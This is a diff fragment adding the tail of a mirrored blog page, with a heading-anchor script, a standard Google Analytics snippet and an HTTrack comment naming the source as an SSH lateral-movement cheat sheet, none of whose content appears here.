+        header.appendChild(anchorForId(header.id));
+      }
+    }
+  };
+
+  document.onreadystatechange = function () {
+    if (this.readyState === "complete") {
+      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
+      if (!contentBlock) {
+        return;
+      }
+      for (var level = 1; level <= 6; level++) {
+        linkifyAnchors(level, contentBlock);
+      }
+    }
+  };
+</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-55017594-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</body>
+
+<!-- Mirrored from highon.coffee/blog/ssh-lateral-movement-cheat-sheet/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Dec 2022 15:33:12 GMT -->
+</html>
